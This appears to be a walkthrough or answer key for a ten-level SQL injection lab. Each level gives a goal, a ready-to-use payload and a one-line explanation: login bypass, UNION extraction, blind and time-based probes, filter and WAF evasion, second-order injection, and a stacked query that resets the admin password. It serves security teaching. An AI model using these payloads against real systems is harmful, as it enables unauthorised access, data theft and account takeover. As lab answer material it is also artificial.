## Level 1: Login Bypass (String)

Goal: Login as admin without password.
Payload (Username):
```
admin' --
```

Explanation: Turns query into SELECT ... WHERE username='admin' --' AND .... Parts after -- are commented out.

## Level 2: Login Bypass (Integer)

Goal: View hidden/all products.
Payload (ID):
```
1 OR 1=1
```

Explanation: Injection in integer context (no quotes), using OR 1=1 makes the condition always true.

## Level 3: UNION Attack (Visible)

Goal: Get Flag from secrets table.
Payload (Search):
```
' UNION SELECT id, flag, 1 FROM secrets--
```

Explanation: Appends results from secrets table to the current search results.

## Level 4: Error Based

Goal: Force database to print syntax error.
Payload:
```
1'
```

Explanation: Extra single quote causes SQL syntax error, confirming vulnerability.

## Level 5: Boolean Blind

Goal: Determine data based on True/False (Found/Not Found) response.
Payload (True):
```
admin' AND 1=1--
```

Payload (False):

admin' AND 1=0--


## Level 6: Time Based Blind

Goal: Delay server response (Database Sleep).
Payload:
```
' AND sleep(3)--
```

Explanation: Uses sleep() function (injected via python into SQLite) to delay 3 seconds.

## Level 7: Filter Bypass (Space)

Goal: Bypass Space character filter.
Payload:
```
1/**/OR/**/1=1
```

Explanation: Uses SQL comments /**/ instead of spaces.

## Level 8: Second Order SQLi

Goal: Privilege escalation via 2 steps.
Step 1 (Register): Register a username containing payload.
```
admin' --
```

Step 2 (View Profile): Admin views the new user's profile. The payload is retrieved from DB and executes a new query: SELECT role FROM users WHERE username = 'admin' --'.

## Level 9: WAF Bypass (Keywords)

Goal: Bypass "UNION SELECT" filter.
Payload:
```
' UNION/**/SELECT id, flag, 1 FROM secrets--
```

Explanation: Insert comments between UNION and SELECT to break the WAF signature.

## Level 10: Stacked Queries

Goal: Change Admin Password (UPDATE statement).
Payload:
```
1; UPDATE users SET password='pwned' WHERE username='admin';--
```

> Explanation: Uses semicolon ; to execute a second SQL statement (UPDATE).